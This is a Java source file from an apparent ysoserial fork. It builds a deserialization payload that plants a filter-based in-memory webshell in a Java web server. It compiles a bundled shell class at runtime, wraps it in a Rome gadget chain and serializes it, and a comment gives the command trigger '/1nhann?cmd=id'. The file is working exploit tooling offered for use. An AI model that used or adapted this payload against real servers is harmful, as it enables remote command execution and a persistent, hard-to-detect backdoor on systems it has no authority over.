package ysoserial.payloads.memshell;

import org.apache.commons.io.IOUtils;
import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.JavaCompiler;

import java.io.InputStream;

//filter 内存马 /1nhann?cmd=id
public class FilterShell {
    public static void main(final String[] args) throws Exception {
        Object evil = new FilterShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }

    public Object getObject(Class gadget) throws Exception {
        InputStream inputStream = FilterShell.class.getClassLoader().getResourceAsStream("内存马/FilterShell.java");
        byte[] bytes = IOUtils.toByteArray(inputStream);
        String java = new String(bytes);
        byte[] b = JavaCompiler.compile("FilterShell",java);
        Class c = ClassFiles.bytesAsClass(b);
        Object o = new Eval().getObject(gadget,c);
        return o;
    }

}
